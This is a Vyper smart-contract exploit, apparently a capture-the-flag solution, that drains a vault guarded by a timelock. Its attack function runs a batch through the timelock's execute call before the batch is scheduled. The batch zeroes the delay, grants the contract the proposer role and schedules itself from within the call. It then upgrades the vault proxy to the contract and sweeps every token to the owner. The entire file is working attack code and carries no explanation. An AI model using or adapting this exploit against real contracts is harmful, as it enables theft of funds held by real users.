# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface ITimelock:
    def execute(
        targets: DynArray[address, max_value(uint8)],
        values: DynArray[uint256, max_value(uint8)],
        dataElements: DynArray[Bytes[max_value(uint16)], max_value(uint8)],
        salt: bytes32,
    ): payable
    def schedule(
        targets: DynArray[address, max_value(uint8)],
        values: DynArray[uint256, max_value(uint8)],
        dataElements: DynArray[Bytes[max_value(uint16)], max_value(uint8)],
        salt: bytes32,
    ): nonpayable 

owner: immutable(address)

_IMPLEMENTATION_SLOT: constant(bytes32) = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

token: address
timelock: address
vault: address

@external
@payable
def __init__(_token: address, _timelock: address, _vault: address):
    owner = msg.sender
    self.token = _token
    self.timelock = _timelock
    self.vault = _vault

@external
def attack():
    assert msg.sender == owner, "!owner"
    targets: DynArray[address, max_value(uint8)] = []
    values: DynArray[uint256, max_value(uint8)] = []
    data_elements: DynArray[Bytes[max_value(uint8)], max_value(uint8)] = []
    targets, values, data_elements = self._build_op()
    ITimelock(self.timelock).execute(targets, values, data_elements, empty(bytes32))

@internal
def _build_op() -> (DynArray[address, max_value(uint8)], DynArray[uint256, max_value(uint8)], DynArray[Bytes[max_value(uint8)], max_value(uint8)]):
    targets: DynArray[address, max_value(uint8)] = [self.timelock, self.timelock, self, self.vault]
    values: DynArray[uint256, max_value(uint8)] = [0, 0, 0, 0]
    data_elements: DynArray[Bytes[max_value(uint8)], max_value(uint8)] = []
    # prep calldata to update delay
    update_delay_data: Bytes[36] = _abi_encode(empty(uint256), method_id=method_id("updateDelay(uint64)"))
    data_elements.append(update_delay_data)
    # prep calldata to grant this contract proposer role
    grant_proposer_role_data: Bytes[68] = _abi_encode(keccak256("PROPOSER_ROLE"), self, method_id=method_id("grantRole(bytes32,address)"))
    data_elements.append(grant_proposer_role_data)
    # prep calldata to schedule the op
    schedule_op_data: Bytes[4] = method_id("schedule_op()")
    data_elements.append(schedule_op_data)
    # prep calldata to upgrade and call new impl
    sweep_funds_data: Bytes[68] = _abi_encode(owner, self.token, method_id=method_id("sweep_funds(address,address)"))
    upgrade_to_and_call_data: Bytes[196] = _abi_encode(self, sweep_funds_data, method_id=method_id("upgradeToAndCall(address,bytes)"))
    data_elements.append(upgrade_to_and_call_data)

    return targets, values, data_elements

@external
def schedule_op():
    targets: DynArray[address, max_value(uint8)] = []
    values: DynArray[uint256, max_value(uint8)] = []
    data_elements: DynArray[Bytes[max_value(uint8)], max_value(uint8)] = []
    targets, values, data_elements = self._build_op()
    ITimelock(self.timelock).schedule(targets, values, data_elements, empty(bytes32))
    
@external
def sweep_funds(receiver: address, asset: address):
    IERC20(asset).transfer(receiver, IERC20(asset).balanceOf(self))

@external
@view
def proxiableUUID() -> bytes32:
    return _IMPLEMENTATION_SLOT
